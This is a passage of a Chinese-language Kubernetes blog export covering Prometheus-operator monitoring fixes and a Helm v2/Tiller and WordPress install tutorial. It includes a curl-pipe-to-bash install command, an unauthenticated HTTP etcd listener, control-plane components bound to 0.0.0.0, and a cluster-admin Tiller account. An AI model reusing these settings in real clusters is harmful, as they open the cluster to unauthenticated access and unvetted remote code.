gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/etc/</span>kubernetes<span class="regexp">/manifests/</span>etcd.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  annotations:</span><br><span class="line">    scheduler.alpha.kubernetes.io/critical-pod: <span class="string">&quot;&quot;</span></span><br><span class="line">  creationTimestamp: <span class="keyword">null</span></span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: etcd-server                                                       #增加此行</span><br><span class="line">    component: etcd</span><br><span class="line">    tier: control-plane</span><br><span class="line">  name: etcd</span><br><span class="line">  namespace: kube-system</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - command:</span><br><span class="line">    - etcd</span><br><span class="line">    - --advertise-client-urls=https:<span class="comment">//172.20.6.116:2379</span></span><br><span class="line">    - --cert-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>etcd/server.crt</span><br><span class="line">    - --client-cert-auth=<span class="keyword">true</span></span><br><span class="line">    - --data-dir=<span class="regexp">/var/</span>lib/etcd</span><br><span class="line">    - --initial-advertise-peer-urls=https:<span class="comment">//172.20.6.116:2380</span></span><br><span class="line">    - --initial-cluster=k8s-master=https:<span class="comment">//172.20.6.116:2380</span></span><br><span class="line">    - --key-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>etcd/server.key</span><br><span class="line">    - --listen-client-urls=https:<span class="comment">//127.0.0.1:2379,https://172.20.6.116:2379,http://172.20.6.116:4001         #增加 4001 端口的 http 监听</span></span><br><span class="line">    - --listen-peer-urls=https:<span class="comment">//172.20.6.116:2380</span></span><br><span class="line">    - --name=k8s-master</span><br><span class="line">    - --peer-cert-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>etcd/peer.crt</span><br><span class="line">    - --peer-client-cert-auth=<span class="keyword">true</span></span><br><span class="line">    - --peer-key-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>etcd/peer.key</span><br><span class="line">    - --peer-trusted-ca-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>etcd/ca.crt</span><br><span class="line">    - --snapshot-<span class="keyword">count</span>=<span class="number">10000</span></span><br><span class="line">    - --trusted-ca-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>etcd/ca.crt</span><br></pre></td></tr></table></figure><p>重启 kubelet 服务即可</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart kubelet.service</span></span><br></pre></td></tr></table></figure><h2 id="3-prometheus-operator-kube-controller-manager-和-prometheus-operator-kube-scheduler-无数据"><a href="#3-prometheus-operator-kube-controller-manager-和-prometheus-operator-kube-scheduler-无数据" class="headerlink" title="3. prometheus-operator-kube-controller-manager 和 prometheus-operator-kube-scheduler 无数据"></a>3. prometheus-operator-kube-controller-manager 和 prometheus-operator-kube-scheduler 无数据</h2><p>由于 kube-controller-manager 和 kube-scheduler 默认监听 127.0.0.1 ，prometheus 无法通过本机地址获取数据，需要修改kube-controller-manager 和 kube-scheduler 监听地址。<br>解决办法如下：<br>kube-controller-manager:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/manifests/kube-controller-manager.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">scheduler.alpha.kubernetes.io/critical-pod:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-controller-manager</span>               <span class="comment">#增加此行</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">kube-controller-manager</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">control-plane</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-controller-manager</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-controller-manager</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--address=0.0.0.0</span>                                   <span class="comment">#修改监听地址</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--allocate-node-cidrs=true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kube-scheduler:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/kubernetes/manifests/kube-scheduler.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">scheduler.alpha.kubernetes.io/critical-pod:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-scheduler</span>                         <span class="comment">#增加此行</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">kube-scheduler</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">control-plane</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-scheduler</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-scheduler</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--address=0.0.0.0</span>                                   <span class="comment">#修改监听地址</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubeconfig=/etc/kubernetes/scheduler.conf</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--leader-elect=true</span></span><br></pre></td></tr></table></figure><p>重启 kubelet 服务即可</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart kubelet.service</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> helm </tag>
            
            <tag> prometheus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes 安装 Helm 并使用 Helm 安装 wordpress</title>
      <link href="docker/kubernetes-install-helm-and-wordpress.html"/>
      <url>docker/kubernetes-install-helm-and-wordpress.html</url>
      
        <content type="html"><![CDATA[<h1 id="Helm-简介"><a href="#Helm-简介" class="headerlink" title="Helm 简介"></a>Helm 简介</h1><p>Helm 有两个重要的概念：chart 和 release。</p><p>chart 是创建一个应用的信息集合，包括各种 Kubernetes 对象的配置模板、参数定义、依赖关系、文档说明等。chart 是应用部署的自包含逻辑单元。可以将 chart 想象成 apt、yum 中的软件安装包。</p><p>release 是 chart 的运行实例，代表了一个正在运行的应用。当 chart 被安装到 Kubernetes 集群，就生成一个 release。chart 能够多次安装到同一个集群，每次安装都是一个 release。</p><p>Kubernetes Helm 是一个管理预先配置 Kubernetes 资源包的工具，这里的资源在 Helm 中也被称作 Kubernetes charts。使用 Helm可以：</p><ul><li>查找并使用已经打包为 Kubernetes charts 的流行软件</li><li>分享您自己的应用作为 Kubernetes charts</li><li>为 Kubernetes 应用创建可重复执行的构建</li><li>为您的 Kubernetes 清单文件提供更智能化的管理</li><li>管理 Helm 软件包的发布</li></ul><p>Helm 包含两个组件：Helm 客户端和 Tiller 服务器，如下图所示。<br><img data-src="/images/uploads/2019/01/helm.png" alt="helm"></p><p>Helm 客户端负责 chart 和 release 的创建和管理以及和 Tiller 的交互。Tiller 服务器运行在 Kubernetes 集群中，它会处理 Helm 客户端的请求，与 Kubernetes API Server 交互。</p><span id="more"></span><h1 id="安装和部署-Helm"><a href="#安装和部署-Helm" class="headerlink" title="安装和部署 Helm"></a>安装和部署 Helm</h1><h2 id="安装-Helm-客户端"><a href="#安装-Helm-客户端" class="headerlink" title="安装 Helm 客户端"></a>安装 Helm 客户端</h2><p>所有运行 kubectl 的节点均需要安装</p><h3 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1. 下载安装"></a>1. 下载安装</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># curl https:<span class="comment">//raw.githubusercontent.com/helm/helm/master/scripts/get | bash</span></span><br><span class="line"></span><br><span class="line">Downloading https:<span class="comment">//kubernetes-helm.storage.googleapis.com/helm-v2.12.1-linux-amd64.tar.gz</span></span><br><span class="line">Preparing to install helm and tiller <span class="keyword">into</span> <span class="regexp">/usr/</span>local/bin</span><br><span class="line">helm installed <span class="keyword">into</span> <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>helm</span><br><span class="line">tiller installed <span class="keyword">into</span> <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>tiller</span><br><span class="line">Run <span class="string">&#x27;helm init&#x27;</span> to configure helm.</span><br></pre></td></tr></table></figure><h3 id="2-验证安装"><a href="#2-验证安装" class="headerlink" title="2. 验证安装"></a>2. 验证安装</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"># helm version</span><br><span class="line"></span><br><span class="line">Client: &amp;version.Version&#123;SemVer:&quot;v2.12.1&quot;, GitCommit:&quot;02a47c7249b1fc6d8fd3b94e6b4babf9d818144e&quot;, GitTreeState:&quot;clean&quot;&#125;</span><br><span class="line"><span class="keyword">Error: </span>could not find tiller</span><br></pre></td></tr></table></figure><p>安装安装的版本为 2.12.1，tiller 服务器还没有安装所以有一个报错</p><h3 id="3-安装-helm-的-bash-命令补全脚本"><a href="#3-安装-helm-的-bash-命令补全脚本" class="headerlink" title="3. 安装 helm 的 bash 命令补全脚本"></a>3. 安装 helm 的 bash 命令补全脚本</h3><p>helm 有很多子命令和参数，为了提高使用命令行的效率，通常建议安装 helm 的 bash 命令补全脚本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> helm completion bash &gt; .helmrc &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;source .helmrc&quot;</span> &gt;&gt; .bashrc</span></span><br></pre></td></tr></table></figure><p>重新登陆后，就能通过 TAB 自动补全  helm 命令的子命令和参数了。<br><img data-src="/images/uploads/2019/01/bash.png" alt="bash"></p><h2 id="安装-Tiller-服务器"><a href="#安装-Tiller-服务器" class="headerlink" title="安装 Tiller 服务器"></a>安装 Tiller 服务器</h2><h3 id="1-导入-tiller-镜像"><a href="#1-导入-tiller-镜像" class="headerlink" title="1. 导入 tiller 镜像"></a>1. 导入 tiller 镜像</h3><p>所有节点上面导入 tiller.tar，下载地址：<a href="https://pan.baidu.com/s/1dKNbg7b9IBtPBnadLUADlg">tiller.tar</a></p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># docker load -i tiller.tar</span></span><br></pre></td></tr></table></figure><h3 id="2-创建-helm-服务账号"><a href="#2-创建-helm-服务账号" class="headerlink" title="2. 创建 helm 服务账号"></a>2. 创建 helm 服务账号</h3><p>创建 tiller-rbac-config.yaml 文件，加入以下内容</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim tiller-rbac-config.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">tiller</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">tiller</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">tiller</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br></pre></td></tr></table></figure><p>运行以下命令创建 tiller 服务账号</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl apply -f tiller-rbac-config.yaml</span></span><br></pre></td></tr></table></figure><h3 id="3-部署-tiller"><a href="#3-部署-tiller" class="headerlink" title="3. 部署 tiller"></a>3. 部署 tiller</h3><p>Tiller 服务器安装非常简单，只需要执行 helm init，这里我们指定使用上一步创建的服务账号。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># helm init --service-account tiller</span></span><br><span class="line"></span><br><span class="line">Creating <span class="regexp">/root/</span>.helm </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm/repository </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm<span class="regexp">/repository/</span>cache </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm<span class="regexp">/repository/</span>local </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm/plugins </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm/starters </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm<span class="regexp">/cache/</span>archive </span><br><span class="line">Creating <span class="regexp">/root/</span>.helm<span class="regexp">/repository/</span>repositories.yaml </span><br><span class="line">Adding stable repo with URL: https:<span class="regexp">//</span>kubernetes-charts.storage.googleapis.com </span><br><span class="line">Adding local repo with URL: http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8879</span>/charts </span><br><span class="line"><span class="variable">$HELM_HOME</span> has been configured at <span class="regexp">/root/</span>.helm.</span><br><span class="line"></span><br><span class="line">Tiller (the Helm server-side component) has been installed into your Kubernetes Cluster.</span><br><span class="line"></span><br><span class="line">Please note: by default, Tiller is deployed with an insecure <span class="string">&#x27;allow unauthenticated users&#x27;</span> policy.</span><br><span class="line">To prevent this, run `helm init` with the --tiller-tls-verify flag.</span><br><span class="line">For more information on securing your installation see: https:<span class="regexp">//</span>docs.helm.sh<span class="regexp">/using_helm/</span><span class="comment">#securing-your-helm-installation</span></span><br><span class="line">Happy Helming!</span><br></pre></td></tr></table></figure><h2 id="验证操作"><a href="#验证操作" class="headerlink" title="验证操作"></a>验证操作</h2><h3 id="1-查看-tiller-状态"><a href="#1-查看-tiller-状态" class="headerlink" title="1. 查看 tiller 状态"></a>1. 查看 tiller 状态</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pods --namespace kube-system </span></span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>                                   READY   STATUS    RESTARTS   AGE</span><br><span class="line"><span class="attribute">coredns</span>-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-<span class="number">8</span>zhr<span class="number">5</span>               <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">coredns</span>-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-jqn<span class="number">7</span>r               <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">etcd</span>-k<span class="number">8</span>s-master                        <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-apiserver-k<span class="number">8</span>s-master              <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-controller-manager-k<span class="number">8</span>s-master     <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-flannel-ds-amd<span class="number">64</span>-krf<span class="number">6</span>t            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-flannel-ds-amd<span class="number">64</span>-tkftg            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-flannel-ds-amd<span class="number">64</span>-zxzld            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-proxy-<span class="number">5</span>znt<span class="number">7</span>                       <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-proxy-gl<span class="number">9</span>sl                       <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-proxy-q<span class="number">7</span>j<span class="number">7</span>m                       <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kube</span>-scheduler-k<span class="number">8</span>s-master              <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">1</span>          <span class="number">5</span>d<span class="number">16</span>h</span><br><span class="line"><span class="attribute">kubernetes</span>-dashboard-<span class="number">57</span>df<span class="number">4</span>db<span class="number">6</span>b-<span class="number">8</span>b<span class="number">2</span>l<span class="number">4</span>   <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">16</span>h</span><br><span class="line"><span class="attribute">metrics</span>-server-<span class="number">879</span>f<span class="number">5</span>ff<span class="number">6</span>d-tpszf         <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">16</span>h</span><br><span class="line"><span class="attribute">tiller</span>-deploy-<span class="number">6</span>f<span class="number">8</span>d<span class="number">4</span>f<span class="number">6</span>c<span class="number">9</span>c-<span class="number">4</span>h<span class="number">95</span>z         <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>m<span class="number">39</span>s</span><br></pre></td></tr></table></figure><p>可以看到 tiller 已经是运行状态。</p><h3 id="2-查看-helm-信息"><a href="#2-查看-helm-信息" class="headerlink" title="2. 查看 helm 信息"></a>2. 查看 helm 信息</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># helm <span class="keyword">version</span></span><br><span class="line"></span><br><span class="line">Client: &amp;<span class="keyword">version</span>.<span class="keyword">Version</span>&#123;SemVer:&quot;v2.12.1&quot;, GitCommit:&quot;02a47c7249b1fc6d8fd3b94e6b4babf9d818144e&quot;, GitTreeState:&quot;clean&quot;&#125;</span><br><span class="line"><span class="keyword">Server</span>: &amp;<span class="keyword">version</span>.<span class="keyword">Version</span>&#123;SemVer:&quot;v2.12.1&quot;, GitCommit:&quot;02a47c7249b1fc6d8fd3b94e6b4babf9d818144e&quot;, GitTreeState:&quot;clean&quot;&#125;</span><br></pre></td></tr></table></figure><h1 id="使用-Helm-安装-wordpress"><a href="#使用-Helm-安装-wordpress" class="headerlink" title="使用 Helm 安装 wordpress"></a>使用 Helm 安装 wordpress</h1><h2 id="1-搜索-chart"><a href="#1-搜索-chart" class="headerlink" title="1. 搜索 chart"></a>1. 搜索 chart</h2><p>搜索 wordpress 的 charts</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># helm search wordpress</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>            CHART VERSIONAPP VERSIONDESCRIPTION                                             </span><br><span class="line"><span class="attribute">stable</span>/wordpress<span class="number">5</span>.<span class="number">0</span>.<span class="number">3</span>        <span class="number">5</span>.<span class="number">0</span>.<span class="number">2</span>      Web publishing platform for building blogs and websites.</span><br></pre></td></tr></table></figure><h2 id="2-查看-chart-的存储信息"><a href="#2-查看-chart-的存储信息" class="headerlink" title="2. 查看 chart 的存储信息"></a>2. 查看 chart 的存储信息</h2><p>创建 wordpress 的时候需要申请  PersistentVolumeClaim，由于我们的环境不支持动态申请所以需要手动创建</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># helm inspect value stable/wordpress</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">  ## MariaDB admin password</span><br><span class="line">  ## ref: https:<span class="comment">//github.com/bitnami/bitnami-docker-mariadb/blob/master/README.md#setting-the-root-password-on-first-run</span></span><br><span class="line">  ##</span><br><span class="line">  # rootUser:</span><br><span class="line">  #   password:</span><br><span class="line"></span><br><span class="line">  ## Enable persistence using Persistent Volume Claims</span><br><span class="line">  ## ref: http:<span class="comment">//kubernetes.io/docs/user-guide/persistent-volumes/</span></span><br><span class="line">  ##</span><br><span class="line">  master:</span><br><span class="line">    persistence:</span><br><span class="line">      enabled: true</span><br><span class="line">      ## mariadb data Persistent Volume Storage Class</span><br><span class="line">      ## If defined, storageClassName: &lt;storageClass&gt;</span><br><span class="line">      ## If set to <span class="string">&quot;-&quot;</span>, storageClassName: <span class="string">&quot;&quot;</span>, which disables dynamic provisioning</span><br><span class="line">      ## If undefined (the default) or set to null, no storageClassName spec is</span><br><span class="line">      ##   set, choosing the default provisioner.  (gp2 on AWS, standard on</span><br><span class="line">      ##   GKE, AWS &amp; OpenStack)</span><br><span class="line">      ##</span><br><span class="line">      # storageClass: <span class="string">&quot;-&quot;</span></span><br><span class="line">      accessMode: ReadWriteOnce</span><br><span class="line">      size: <span class="number">8</span>Gi</span><br><span class="line">      </span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">persistence:</span><br><span class="line">  enabled: true</span><br><span class="line">  ## wordpress data Persistent Volume Storage Class</span><br><span class="line">  ## If defined, storageClassName: &lt;storageClass&gt;</span><br><span class="line">  ## If set to <span class="string">&quot;-&quot;</span>, storageClassName: <span class="string">&quot;&quot;</span>, which disables dynamic provisioning</span><br><span class="line">  ## If undefined (the default) or set to null, no storageClassName spec is</span><br><span class="line">  ##   set, choosing the default provisioner.  (gp2 on AWS, standard on</span><br><span class="line">  ##   GKE, AWS &amp; OpenStack)</span><br><span class="line">  ##</span><br><span class="line">  # storageClass: <span class="string">&quot;-&quot;</span></span><br><span class="line">  ##</span><br><span class="line">  ## If you want to reuse an existing claim, you can pass the name <span class="keyword">of</span> the PVC using</span><br><span class="line">  ## the existingClaim variable</span><br><span class="line">  # existingClaim: your-claim</span><br><span class="line">  accessMode: ReadWriteOnce</span><br><span class="line">  size: <span class="number">10</span>Gi</span><br></pre></td></tr></table></figure><p>可以看到 wordpress 的 chart 需要两个 pv，分别用于 mariadb(8G) 和 wordpress(10G) 的数据存储。</p><h2 id="3-手动创建-chart-所需的-pv"><a href="#3-手动创建-chart-所需的-pv" class="headerlink" title="3. 手动创建 chart 所需的 pv"></a>3. 手动创建 chart 所需的 pv</h2><p>创建 create-pv.yml 文件，输入以下内容</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim create-pv.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">mariadb-pv</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">8Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteOnce</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="string">Retain</span></span><br><span class="line">  <span class="comment">#storageClassName: nfs</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfsdata/mariadb-pv</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">172.20</span><span class="number">.6</span><span class="number">.116</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">wordpress-pv</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">10Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteOnce</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="string">Retain</span></span><br><span class="line">  <span class="comment">#storageClassName: nfs</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfsdata/wordpress-pv</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">172.20</span><span class="number">.6</span><span class="number">.116</span></span><br></pre></td></tr></table></figure><p>创建 pv</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"># kubectl <span class="built_in">apply</span> -f create-<span class="built_in">pv</span>.yml </span><br><span class="line"></span><br><span class="line">persistentvolume/mariadb-<span class="built_in">pv</span> created</span><br><span class="line">persistentvolume/wordpress-<span class="built_in">pv</span> created</span><br></pre></td></tr></table></figure><h2 id="4-安装-chart"><a href="#4-安装-chart" class="headerlink" title="4. 安装 chart"></a>4. 安装 chart</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"># helm install --name wordpress stable/wordpress</span><br><span class="line"></span><br><span class="line">NAME:   wordpress                                  ---------①---------</span><br><span class="line">LAST DEPLOYED: Fri Jan  <span class="number">4</span> <span class="number">10</span>:<span class="number">32</span>:<span class="number">57</span> <span class="number">2019</span></span><br><span class="line">NAMESPACE: default</span><br><span class="line">STATUS: DEPLOYED</span><br><span class="line"></span><br><span class="line">RESOURCES:                                         ---------②---------</span><br><span class="line">==&gt; v1beta1/Deployment</span><br><span class="line">NAME                 DESIRED  CURRENT  UP-TO-DATE  AVAILABLE  AGE</span><br><span class="line">wordpress-wordpress  <span class="number">1</span>        <span class="number">1</span>        <span class="number">1</span>           <span class="number">0</span>          <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line">==&gt; v1beta1/StatefulSet</span><br><span class="line">NAME               DESIRED  CURRENT  AGE</span><br><span class="line">wordpress-mariadb  <span class="number">1</span>        <span class="number">1</span>        <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line">==&gt; v1/<span class="constructor">Pod(<span class="params">related</span>)</span></span><br><span class="line">NAME                                  READY  STATUS   RESTARTS  AGE</span><br><span class="line">wordpress-wordpress-<span class="number">56794</span>ff7b9-rf98x  <span class="number">0</span>/<span class="number">1</span>    Pending  <span class="number">0</span>         <span class="number">0</span>s</span><br><span class="line">wordpress-mariadb-<span class="number">0</span>                   <span class="number">0</span>/<span class="number">1</span>    Pending  <span class="number">0</span>         <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line">==&gt; v1/Secret</span><br><span class="line">NAME                 TYPE    DATA  AGE</span><br><span class="line">wordpress-mariadb    Opaque  <span class="number">2</span>     <span class="number">0</span>s</span><br><span class="line">wordpress-wordpress  Opaque  <span class="number">1</span>     <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line">==&gt; v1/ConfigMap</span><br><span class="line">NAME                     DATA  AGE</span><br><span class="line">wordpress-mariadb        <span class="number">1</span>     <span class="number">0</span>s</span><br><span class="line">wordpress-mariadb-tests  <span class="number">1</span>     <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line">==&gt; v1/PersistentVolumeClaim</span><br><span class="line">NAME                 STATUS   VOLUME  CAPACITY  ACCESS MODES  STORAGECLASS  AGE</span><br><span class="line">wordpress-wordpress  Pending  <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line">RESOURCES:</span><br><span class="line">==&gt; v1/Service</span><br><span class="line">NAME                 TYPE          CLUSTER-IP      EXTERNAL-IP  <span class="constructor">PORT(S)</span>                     AGE</span><br><span class="line">wordpress-mariadb    ClusterIP     <span class="number">10.100</span>.<span class="number">218.132</span>  &lt;none&gt;       <span class="number">3306</span>/TCP                    <span class="number">0</span>s</span><br><span class="line">wordpress-wordpress  LoadBalancer  <span class="number">10.100</span>.<span class="number">36.64</span>    &lt;pending&gt;    <span class="number">80</span>:<span class="number">31051</span>/TCP,<span class="number">443</span>:<span class="number">30169</span>/TCP  <span class="number">0</span>s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:                                             ---------③---------</span><br><span class="line"><span class="number">1.</span> Get the WordPress URL:</span><br><span 